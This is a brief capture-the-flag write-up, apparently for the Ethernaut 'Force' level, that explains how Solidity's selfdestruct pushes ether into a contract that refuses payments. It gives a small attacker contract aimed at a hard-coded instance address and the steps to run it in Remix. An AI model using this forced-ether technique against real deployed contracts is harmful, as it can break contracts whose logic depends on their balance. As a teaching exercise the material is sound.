# Force

Didn't really know what *selfdestruct* was until I read the walkthrough.

*selfdesctruct(<payable> _address)* makes the contract go boom and sends all the ether to the *_address*. This can be used in forcing ether into other contracts and in this case what we want.

```solidity
contract contractGoBoom {

  function boom() public {
    address force_addr = (0x665c949f4db87E95dbCE9DEf58C747D343dc4867);
    selfdestruct(payable(force_addr));
  }

  function collect() public payable returns(uint) {
    return address(this).balance;
  }
}
```

Using Remix IDE we give ether to the contract using *collect* then make it selfdestruct with the instance address as our target. 